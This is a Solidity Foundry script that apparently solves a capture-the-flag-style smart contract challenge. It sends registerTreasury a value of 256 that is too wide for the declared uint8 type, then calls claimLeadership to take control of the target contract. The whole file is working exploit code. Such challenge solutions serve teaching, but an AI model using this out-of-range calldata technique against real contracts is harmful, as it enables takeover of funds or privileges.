// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";


interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}
contract SolverScript is Script {

    IHigherOrder target;

    function setUp() public {
        target = IHigherOrder(0x78d8b587C050cd7829b8554B7f25a27006A2eB66);
    }

    function run() public {
        vm.startBroadcast();

        (bool success, ) = address(target).call(abi.encodeWithSelector(IHigherOrder.registerTreasury.selector, 256));
        success;
        target.claimLeadership();

        vm.stopBroadcast();
    }
}
